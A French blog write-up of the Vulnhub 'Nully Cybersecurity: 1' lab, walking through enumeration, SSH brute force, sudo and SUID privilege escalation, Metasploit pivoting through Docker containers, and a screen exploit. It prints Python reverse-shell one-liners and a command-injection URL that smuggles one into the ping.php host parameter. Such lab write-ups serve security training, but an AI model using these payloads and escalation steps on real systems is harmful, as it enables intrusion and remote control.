---
layout: default
title: "Writeup Nully Cybersecurity: 1 - Vulnhub"
date:   2020-09-14 07:00:00 +0200
published: true
categories:
  - Writeup
---

# Informations sur la box :

* **Difficulté** : Facile / Moyenne
* **Description** : *While working with the machine, you will need to brute force, pivoting (using metasploit, via portfwd), exploitation web app, and using searchsploit. About: Wait 5-8 minutes before starting for the machine to start its services. Also, check the welcome page on port 80. Hints: 'cat rockyou.txt \| grep bobby > wordlist' for generating wordlist. Story: You are a Professional White Hat. Small company Nully Cybersecurity hired you to conduct a security test of their internal corporate systems.*
* **Type de fichier** : .ova (VirtualBox)
* **DHCP** : Activé
* **Lien** : [https://www.vulnhub.com/entry/nully-cybersecurity-1,549/](https://www.vulnhub.com/entry/nully-cybersecurity-1,549/)


### Ce que nous allons aborder dans ce writeup :

### Partie 1 :

*	  [Énumération](#énumération)
* 	[Shell basique](#shell-basique)
*	  [Privilege escalation](#privilege-escalation)

### Partie 2 :

*	  [Énumération](#deuxième-énumération)
* 	[Pivoter](#pivoter)
* 	[Shell basique](#shell-deuxième-machine)
*	  [Privilege escalation](#privilege-escalation-deuxième-machine)

### Partie 3 :

* 	[Énumération](énumération-finale)
* 	[Shell basique](#shell-basique-final)
*	  [Privilege escalation](#privilege-escalation-final)


* * *

## Énumération
* * *

Avant de commencer je tiens à dire que cette box a pour le moment été **la plus fun** et également celle où **j'ai le plus appris**. Un grand merci à son créateur [@laf3r_](https://twitter.com/@laf3r_)

On commence comme d'habitude avec un **ping scan** pour trouver la machine sur le réseau :

```bash
nmap -sP 192.168.1.0/24
```

On obtient l'adresse IP de la machine à attaquer qui est la suivante : **192.168.1.39**

On scanne ensuite les ports pour trouver ceux qui sont ouverts avec les services qui tournent dessus :

```bash
nmap -sV -p- 192.168.1.39 -O -A --min-rate 5000 -T5
```

* **-sV** : Permet de scanner les services et d'indiquer les versions et les informations correspondantes
* **-p-** : On scan TOUS les ports
* **-O** : Détection de l'OS
* **-A** : Mode aggressif
* **--min-rate 5000** : Définit le nombre d'envoi de paquets par secondes
* **-T5** : Définit le template comme "rapide"

Pour plus d'informations vous pouvez consulter le ``man`` de nmap.

On obtient :

```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to the Nully Cybersecurity CTF
110/tcp  open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES TOP AUTH-RESP-CODE PIPELINING CAPA SASL(PLAIN LOGIN) USER UIDL
2222/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
9000/tcp open  cslistener?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: max-age=31536000
|     Content-Length: 23203
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Wed, 22 Jul 2020 22:47:36 GMT
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 10 Sep 2020 13:15:33 GMT
|     <!DOCTYPE html
|     ><html lang="en" ng-app="portainer">
|     <head>
|     <meta charset="utf-8" />
|     <title>Portainer</title>
|     <meta name="description" content="" />
|     <meta name="author" content="Portainer.io" />
|     <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
|     <!--[if lt IE 9]>
|     <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
|     <![endif]-->
|     <!-- Fav and touch icons -->
|     <link rel="apple-touch-icon" sizes="180x180" href="dc4d092847be46242d8c013d1bc7c494.png" />
|     <link rel="icon" type="image/png" sizes="32x32" href="5ba13dcb526292ae707310a54e103cd1.png"
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: max-age=31536000
|     Content-Length: 23203
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Wed, 22 Jul 2020 22:47:36 GMT
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 10 Sep 2020 13:15:34 GMT
|     <!DOCTYPE html
|     ><html lang="en" ng-app="portainer">
|     <head>
|     <meta charset="utf-8" />
|     <title>Portainer</title>
|     <meta name="description" content="" />
|     <meta name="author" content="Portainer.io" />
|     <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
|     <!--[if lt IE 9]>
|     <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
|     <![endif]-->
|     <!-- Fav and touch icons -->
|     <link rel="apple-touch-icon" sizes="180x180" href="dc4d092847be46242d8c013d1bc7c494.png" />
|_    <link rel="icon" type="image/png" sizes="32x32" href="5ba13dcb526292ae707310a54e103cd1.png"
```

Avant de tenter d'attaquer un service on remarque que l'auteur nous indique qu'il ne faut **pas attaquer** les ports **80, 8000 et 9000** de la machine hôte.

On va également se rendre sur le site web pour avoir plus d'informations.

On apprend alors qu'il y a 3 serveurs qui tournent sur la machine (grâce à des **dockers**) :

``` 
1. Mail server.
2. Web server.
3. Database server.
```

On nous donne également une information cruciale pour commencer : 

```
To start, check your email on port 110 with authorization data pentester:qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
```

On connait désormais les **identifiants** pour se connecter sur le port 110. ``nmap`` nous l'avait déjà indiqué, il s'agit d'un **serveur de mails**. Allons faire un tour dessus :

```bash
nc 192.168.1.39 110
```

Comme c'est un serveur utilisant le protocole **POP3** nous devons utiliser les commandes associées. Voici une liste de quelques commandes utilisables : [https://electrictoolbox.com/pop3-commands/](https://electrictoolbox.com/pop3-commands/).

Il faut commencer par s'identifier avec les mots clés ``USER`` et ``PASSWORD`` puis lister la liste des mails accessible ``LIST`` pour enfin les afficher ``RETR <number>`` :

```bash
USER pentester
PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
LIST
RETR 1
```

On obtient alors le mail suivant :

```
From: root <root@MailServer>

Hello,
I'm Bob Smith, the Nully Cybersecurity mail server administrator.
The boss has already informed me about you and that you need help accessing the server.
Sorry, I forgot my password, but I remember the password was simple.
```

Nous avons le nom d'une personne qui peut potentiellement être un nom d'utilisateur. Par exemple ``bsmith``, ``bobsmith``, ``bob`` ...

* * *

## Shell basique

On se rappelle aussi qu'au début l'auteur de la box nous avait donné un indice pour éviter que l'on passe 50 heures sur du brute force :

```
Hints: 'cat rockyou.txt | grep bobby > wordlist' for generating wordlist.
```

``bobby`` ressemble fortement au Bob qui apparaît dans le mail. C'est donc une bonne piste. On va exécuter la commande pour **générer une nouvelles wordlist** dans laquelle se trouvera tous les mots du fameux dictionnaire rockyou qui contiennent le mot ``bobby``.

On tente le brute force du **SSH** avec l'utilisateur ``bob`` (on va commencer par le plus commun et le plus plausible) via l'outil ``hydra`` :

```bash
hydra -l bob -P wordlist.txt ssh://192.168.1.39 -s 2222 -t 4 -vV
```

Il ne faudra attendre que quelques instants pour voir apparaître le mot de passe correspondant :

```
[2222][ssh] host: 192.168.1.39   login: bob   password: bobby1985
```

Il ne nous reste plus qu'à se connecter au SSH. On n'oublie pas de préciser le **port** (avec l'option ``-p``) puisque ce n'est pas celui par défaut :

```bash
ssh bob@192.168.1.39 -p 2222
```

On affiche tout de suite le contenu du fichier ``/etc/passwd`` pour voir les potentiels utilisateurs présents sur la machine :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bob:x:1000:1000:Bob Smith,,,,I am sysadmin of the Nully Cybersecurity mail server:/home/bob:/bin/bash
my2user:x:1001:1001:,,,:/home/my2user:/bin/bash
dovecot:x:102:103:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:103:104:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
pentester:x:1002:1002::/home/pentester:/usr/sbin/nologin
postfix:x:104:105::/var/spool/postfix:/usr/sbin/nologin
```

On remarque un certain ``my2user``.

* * *

## Privilege escalation

Un ``sudo -l`` nous donne des informations intéressantes :

```
(my2user) NOPASSWD: /bin/bash /opt/scripts/check.sh
```

Le script ``check.sh`` peut être exécuté en tant que ``my2user``. Le contenu de ce script n'est pas très important. Ce qui nous intéresse ici c'est les droits que nous avons dessus :

```bash
ls -la /opt/scripts/check.sh
-rw-r--r-- 1 bob bob 1249 Aug 25 16:28 /opt/scripts/check.sh
```

Parfait on peut le modifier ! Il nous suffit d'ajouter à la fin du script un simple ``/bin/bash`` pour obtenir un shell en tant que ``my2user`` lorsque le script sera exécuté.

On l'exécute donc :

```
sudo -u my2user /bin/bash /opt/scripts/check.sh
```

Et nous sommes maintenant connectés en tant que ``my2user``. On fait de nouveau un ``sudo -l`` :

```
(root) NOPASSWD: /usr/bin/zip
```

Un petit tour sur [GTFOBins](https://gtfobins.github.io/) nous donne la marche à suivre pour exploiter la faille et gagner les droits ``root`` :

```bash
TF=$(mktemp -u)
sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

Et nous sommes **root** !

On peut aller récupérer notre premier flag :

```bash
cat /root/1_flag.txt
```

```
       .88888.                          dP           dP          dP       
      d8'   `88                         88           88          88       
      88        .d8888b. .d8888b. .d888b88           88 .d8888b. 88d888b. 
      88   YP88 88'  `88 88'  `88 88'  `88           88 88'  `88 88'  `88 
      Y8.   .88 88.  .88 88.  .88 88.  .88    88.  .d8P 88.  .88 88.  .88 
       `88888'  `88888P' `88888P' `88888P8     `Y8888'  `88888P' 88Y8888' 
      oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
                                                                          
	Mail server is rooted.
	You got the first flag: 2c393307906f29ee7fb69e2ce59b4c8a
	Now go to the web server and root it.
```

Jusqu'ici j'ai sû faire sans trop de problèmes car je suis déjà tombé sur des box similaires. Mais à partir d'ici c'était tout nouveau pour moi donc j'ai pas mal galéré.

* * *

## Deuxième énumération

On se souvient qu'il y a **3 serveurs** qui tournent sur cette machine. Nous en avons déjà rooté 1. Il faut maintenant pouvoir accéder aux deux suivants. Mais comment ?

On peut commencer à lister les interfaces présentes sur la machine :

```bash
ifconfig  

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.5  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:05  txqueuelen 0  (Ethernet)
        RX packets 347  bytes 31781 (31.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 262  bytes 41822 (41.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Le réseau sur lequel nous sommes n'a plus du tout le même adressage que celui qu'on avait de base. Pourquoi ?

Un ~~très beau~~ Paint vous expliquera mieux que moi.

![](../../../../../pictures/writeups/nully-cybersecurity/paint_network.png)

Docker permet de virtualiser différents environnements. Grâce à ça on peut faire tourner plusieurs dockers sur une machine hôte. Dans notre cas c'est ce qu'il se passe. Chaque docker se situe dans un même sous réseau sur la machine hôte qui elle est sur le réseau 192.168.1.0/24.

Comment c'est possible ? 

Quand on se connecte en SSH sur le port 2222 de la machine 192.168.1.39 on arrive en fait directement dans un docker qui lui est dans le sous réseau 172.17.0.0/16. A partir de là on peut accéder à tous les autres dockers de ce même sous réseau.

C'est ici que commence notre **pivot** ! Pour ce faire nous allons utiliser **Metasploit** qui va beaucoup nous faciliter la tâche. Mais avant il faut prendre les informations nécessaire en énumérant toutes les machines présentes sur le réseau 172.17.0.0/16. Pour cela ``nmap`` va nous aider (heureusement pour nous il est déjà présent sur la machine cible) :

```bash
nmap -sV -A 172.17.0.0/24
```

Ici on met ``/24`` pour que le scan soit plus rapide parce qu'il est peu probable que les machines sur ce réseau aient une adresse IP du style ``172.17.50.2``.

```
Nmap scan report for 172.17.0.2
Host is up (0.00032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Nully Cybersecurity
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.17.0.3
Host is up (0.00028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Aug 27 09:35 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for MailServer (172.17.0.5)
Host is up (0.00031s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN LOGIN) USER UIDL CAPA RESP-CODES PIPELINING TOP AUTH-RESP-CODE
143/tcp open  imap    Dovecot imapd (Ubuntu)
|_imap-capabilities: SASL-IR capabilities ENABLE more have AUTH=LOGINA0001 post-login listed OK ID Pre-login LITERAL+ IDLE AUTH=PLAIN IMAP4rev1 LOGIN-REFERRALS
```

Le flag qu'on vient d'obtenir nous dit de se diriger vers le **serveur Web**. Il s'agit de la machine **172.17.0.2**.

Sauf que le **problème** est le suivant : comment peut-on accéder via notre navigateur (sur le réseau 192.168.1.0/24) au serveur web situé sur le réseau 172.17.0.0/16 ?

La réponse est qu'il faut faire du port forwarding pour rediriger le flux d'un réseau à l'autre. Et c'est là qu'intervient **Metasploit** !

* * *

## Pivoter

Si c'est encore un peu brouillon pour certains voici un petit **récapitulatif** de ce qu'on veut faire actuellement :

* Nous sommes actuellement root sur la machine 172.17.0.5 sur le réseau 172.17.0.0/16.
* Nous voulons accéder en local (réseau 192.168.1.0/24) le port 80 sur serveur 172.17.0.2 qui lui aussi est sur le réseau 172.17.0.0/16.
* Il nous faut donc faire du port forwarding et nous allons utiliser **Metasploit**.

La première chose à faire est de récupérer un shell sur Metasploit. On se met en écoute sur le port 4444 :

```bash
msfconsole

use multi/handler
set payload linux/x86/shell_reverse_tcp
set lhost 192.168.1.16
run
```

Sur la machine cible (``172.17.0.5``) sur laquelle on est root, on doit exécuter un reverse shell pour se connecter sur notre port 4444. 
Personnellement j'en ai utilisé un en Python qui provient d'[**ici**](https://highon.coffee/blog/reverse-shell-cheat-sheet/).

Il faut juste changer la version de Python car sur la machine uniquement ``python3`` est présent :

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.16",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

On obtient donc un shell sur Metasploit. Il faut maintenant upgrade notre simple shell en **meterperter** pour avoir plus d'options :

```bash
background
use post/multi/manage/shell_to_meterpreter
set session 1
run
```

Ici ``background`` nous permet de mettre en fond la session actuelle pour y revenir plus tard. La session a été définie avec le numéro 1 mais il se peut que de votre côté ce numéro **soit différent** si vous avez déjà ouvert plusieurs sessions au préalable.

On se retrouve alors avec une nouvelle session créée qui est un meterpreter. 

Si on liste les sessions actives on devrait en avoir 2. Celle qui nous intéresse est la sessions **meterpreter** :

```bash
sessions -l
``` 
```
Active sessions
===============

  Id  Name  Type                   Information                                                    Connection
  --  ----  ----                   -----------                                                    ----------
  2         meterpreter x86/linux  root @ MailServer (uid=0, gid=0, euid=0, egid=0) @ 172.17.0.5  192.168.1.16:4433 -> 192.168.1.39:58950 (172.17.0.5)
```

On peut voir que la connexion se fait bien de nous à la machine cible. Il est également précisé l'adresse dans le sous réseau (``172.17.0.5``).

Il nous faut **ajouter une nouvelle route** pour l'ensemble du réseau 172.17.0.0/16. A quoi servira cette route ? Elle servira comme point d'entrée et de sortie pour les paquets. C'est-à-dire qu'on va spécifier le chemin à emprunter pour tous les paquets en destination du sous réseau 172.17.0.0/16. 

Ajouter une route se fait facilement : 

```bash
sessions -i 2
run autoroute -s 172.17.0.0/16
run autoroute -p
```

La première commande sert à intéragir avec la sessions meterpreter, la deuxième commande sert à **créer la route** tandis que la seconde permet de **lister** toutes les routes actives et donc de vérifier que notre première commande a bien fonctionné correctement.

En cas d'erreur vous pouvez toujours supprimer une route (à vous d'aller chercher les options requises).

La dernière commande nous sort ce résultat :

```
Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.17.0.0         255.255.0.0        Session 2
```

Cela indique à la machine 192.168.1.39 que TOUS les paquets à destination du sous réseau 172.17.0.0/16 doivent passer par la passerelle ``Session 2`` (qui est notre meterpreter).

Une fois cette éape effectée il nous faut faire une redirection de ports qui nous redirige vers le port 80 du serveur web.

On peut aussi le faire très facilement avec notre session meterpreter :

```bash
portfwd add -l 8888 -p 80 -r 172.17.0.2
```

Dans cette commande on dit qu'on veut ajouter (``add``) une nouvelle règle de **port forwarding** accessible sur notre **port local 8888** et qui **redirige** vers le port 80 de la machine ``172.17.0.2``

A partir de là on devrait pouvoir accéder à la page ``http://172.17.0.2:80`` mais en local en se rendant sur ``http://localhost:8888``.

* * *

## Shell deuxième machine

Sur le site à première vue rien de bien intéressant. On va donc utiliser ``fuff`` pour découvrir de potentiels fichiers et dossiers cachés :

```bash
/opt/ffuf/ffuf -u http://127.0.0.1:8888/FUZZ -w /usr/share/dirb/wordlists/directory-list-2.3-big.txt -e .html,.txt,.php
```
```
index.html              [Status: 200, Size: 209, Words: 16, Lines: 10]
robots.txt              [Status: 200, Size: 6, Words: 1, Lines: 2]
ping                    [Status: 301, Size: 312, Words: 20, Lines: 10]
```

Allons voir ce qu'on trouve dans le fichier ``http://127.0.0.1:8888/robots.txt`` :

```
/ping
```

On l'avait déjà trouvé avec ``fuff``. On s'y rend donc et on se retrouve avec deux fichiers :

```
http://localhost:8888/ping/For-Oscar.txt

This web application uses the ping utility to check other servers. I think this is more convenient than writing ping in the console every time, so I'll leave this one here. -Oliver
```
```
http://localhost:8888/ping/ping.php
```

La note pour **Oscar** nous donne plusieurs informations. On obtient déjà deux potentiels utilisateurs : ``oliver`` et ``oscar``.                                                                      
On sait également que ``ping.php`` fait des pings vers d'autres serveurs.

En se rendant sur la page ``ping.php`` on peut voir qu'il faut ajouter le **paramètre host** dans l'URL pour ping une machine :

```
http://localhost:8888/ping/ping.php?host=127.0.0.1

Use the host parameter&ltpre>Array
(
    [0] => PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    [1] => 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.011 ms
    [2] => 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.038 ms
    [3] => 64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms
    [4] => 64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.040 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 received, 0% packet loss, time 3054ms
    [8] => rtt min/avg/max/mdev = 0.011/0.031/0.040/0.012 ms
)
&lt/pre>
```

On va donc pourvoir se ping nous même avec cette commande. Le résultat nous est ensuite affiché. On commence à être rodés là dessus et on se dit directement qu'il doit y avoir une faille quelque part. Que se passe-t-il si j'ajoute une commande derrière l'adresse IP que l'on doit renseigner ?

```
http://localhost:8888/ping/ping.php?host=127.0.0.1;id

Use the host parameter&ltpre>Array
(
    [0] => PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    [1] => 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.011 ms
    [2] => 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.034 ms
    [3] => 64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.042 ms
    [4] => 64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.036 ms
    [5] => 
    [6] => --- 127.0.0.1 ping statistics ---
    [7] => 4 packets transmitted, 4 received, 0% packet loss, time 3054ms
    [8] => rtt min/avg/max/mdev = 0.011/0.030/0.042/0.011 ms
    [9] => uid=33(www-data) gid=33(www-data) groups=33(www-data)
)
&lt/pre>
```

Une nouvelle ligne est apparue et on a bien le résultat de notre commande.

Il ne nous reste plus qu'à obtenir un reverse shell sur la machine de cette manière. J'ai tenté une première fois avec ``netcat`` mais aucun résultat. J'ai donc enchaîné sur ``python3`` :

On n'oublie pas de se mettre en mode écoute avant avec ``nc`` :

```
nc -lnvp 5555
```

Puis on **exécute** notre **payload** via l'URL (attention à bien changer les données, notamment le port et l'adresse IP) :

```
http://localhost:8888/ping/ping.php?host=127.0.0.1;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.16",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

On obtient donc un shell en tant que ```www-data```. Maintenant voyons si on peut devenir un utilisateur. Après avoir affiché le contenu du fichier ``/etc/passwd`` on se rend bien compte que nos deux noms d'utilisateurs sont présents :

```
oscar:x:1000:1000:Oscar White,,,,I am sysadmin of the Nully Cybersecurity web server:/home/oscar:/bin/bash
oliver:x:1001:1001:Oliver Jackson,,,,I am in charge of the website and web applications:/home/oliver:/bin/bash
```

* * *

## Privilege escalation deuxième machine

On regarde les binaires qui peuvent avoir le bit SUID positionné :

```bash
find / -perm -400 2>/dev/null
```

Et effectivement quelque chose nous saute à l'oeil :

```
/usr/bin/python3
```

Si on va voir ses droits :

```bash
ls -la /usr/bin/python3

-rwsr-xr-x 1 oscar oscar 5457568 Aug 26 14:19 /usr/bin/python3
```

Avec l'aide de notre ami [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid), on trouve rapidement une commande qui nous permet d'exploiter cette faiblesse.

```bash
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

On obtient un shell avec les droits d'``oscar``.

Dans son home directory on trouve un fichier ``my_password`` qui contient le mot de passe suivant

```
H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o
```

On peut tenter de chercher les fichiers que l'utilisateur ``oliver`` possède :

```bash
find / -user oliver 2>/dev/null
```

Un fichier ressort :

```
/var/backups/.secret
```

Si on affiche son contenu on se retrouve avec le mot de passe d'``oliver`` : ``4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF``

On pourrait tenter de se connecter à son compte mais nous n'en n'avons pas encore fini avec ses fichiers et dossiers. En effet, dans son répertoire on trouve également un dossier ``scripts`` avec dedans un binaire nommé ``current-date``. On s'aperçoit qu'il possède les **droits SUID** et que le **propriétaire** de ce fichier est ``root``.

Lorsqu'on le lance on obtient uniquement la date du jour. Cependant avec la commande ``strings`` on peut voir toutes les chaînes de caractères lisibles utilisées par le programme :

```
u+UH
[]A\A]A^A_
date
:*3$"
GCC: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
crtstuff.c

```

Je n'en ai indiqué que quelques unes mais on peut déjà voir que la commande ``date`` est utilisée dans ce programme. Vu qu'elle n'est pas spécifiée avec son **chemin complet** on peut profiter de cette occasion pour **exécuter un autre binaire avec le même nom** mais un comportement différent.

On va donc se rendre dans ``/tmp``, copier ``/bin/bash`` dans ce répertoire en le renommant ``date`` puis changer la variable globale ``PATH`` pour la faire exécuter ce qui se trouve dans ``/tmp`` en premier lieu :

```bash
cd /tmp
cp /bin/bash /tmp/date
PATH=/tmp:$PATH
```

Il ne nous reste plus qu'à exécuter de nouveau le binaire ``/home/oscar/script/current-date`` pour obtenir un shell ``root`` !

On récupère le deuxième flag :

```bash
cat /root/2_flag.txt :
```
```
 __          __  _ _       _                  
 \ \        / / | | |     | |                 
  \ \  /\  / /__| | |   __| | ___  _ __   ___ 
   \ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \
    \  /\  /  __/ | | | (_| | (_) | | | |  __/
     \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___|
                                              
                                             
Well done! You second flag: 7afc7a60ac389f8d5c6f8f7d0ec645da
Now go to the Database server.
```

On s'attaque maintenant à la dernière partie de cette box.

* * *

## Énumération finale

En reprennant le précédent scan de ``nmap`` on voit qu'il y a un **serveur FTP** qui autorise l'accès en **anonymous**.

On s'y connecte donc :

```bash
ftp 172.17.0.3
``` 

On donne comme login ``anonymous`` et on laisse le champ du mot de passe vide. On se retrouve connecté sur le serveur et on peut récupérer les fichiers suivants :

```
get pub/test
get pub/.folder/file.txt
get pub/.folder/.backup.zip
```

Attention aux réperoire cachés, il faut bien tout lister avec l'option ``-a``.

Les deux premiers fichiers ne nous donnent aucune information utile. Cependant l'archive **ZIP** est protégée par un mot de passe qu'on va s'empresser de cracker avec ``JohnTheRipper`` :

```bash
/opt/JohnTheRipper/run/zip2john .backup.zip > hash.txt
/opt/JohnTheRipper/run/john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt
```

**ATTENTION !** Si vous voulez récupérer l'archive directement sur votre machine vous pouvez le faire avec ``scp`` : ``scp -P 2222 bob@192.168.1.39:.backup.zip .``

Après quelques instants :

```
1234567890       (backup.zip/creds.txt)
```

On peut donc **unzip** l'archive et récupérer un fichier nommé ``creds.txt`` qui contient les éléments suivants :

```
donald:HBRLoCZ0b9NEgh8vsECS
```

* * *

## Shell basique final

Avec ces identifiants il est possible de se connecter en **SSH** sur la même machine (``172.17.0.3``) :

```bash
ssh donald@172.17.0.3
```

* * *

## Privilege escalation final

Une fois de plus on recherche les binaires qui peuvent posséder le SUID bit :

```bash
find / -perm -4000 2>/dev/null
```

Un binaire inhabituel apparaît :

```bash
/usr/bin/screen-4.5.0
```

Après une courte recherche sur **Google** on touve directement **l'exploit** en question : [https://www.exploit-db.com/exploits/41154](https://www.exploit-db.com/exploits/41154)                    
Il nous suffit de copier son contenu dans un fichier puis de l'exécuter :

```bash
nano /tmp/exploit.sh
chmod +x /tmp/exploit.sh
/tmp/exploit.sh
```

Et on devient root !

```bash
cat /root/3_flag.txt
```
```
    _  _   _____             _           _ _ 
  _| || |_|  __ \           | |         | | |
 |_  __  _| |__) |___   ___ | |_ ___  __| | |
  _| || |_|  _  // _ \ / _ \| __/ _ \/ _` | |
 |_  __  _| | \ \ (_) | (_) | ||  __/ (_| |_|
   |_||_| |_|  \_\___/ \___/ \__\___|\__,_(_)

   6cb25d4789cdd7fa1624e6356e0d825b                                            

Congratulations on getting the final flag! 
You completed the Nully Cybersecurity CTF.
I will be glad if you leave a feedback. 


Twitter https://twitter.com/laf3r_
Discord laf3r#4754
```


Un immense merci à [@laf3r_](https://twitter.com/@laf3r_) pour avoir créé cette magnifique box. C'est la box la **plus réaliste** que j'ai eu à faire jusqu'à présent. J'ai appris énormément sur comment **pivoter dans un réseau**.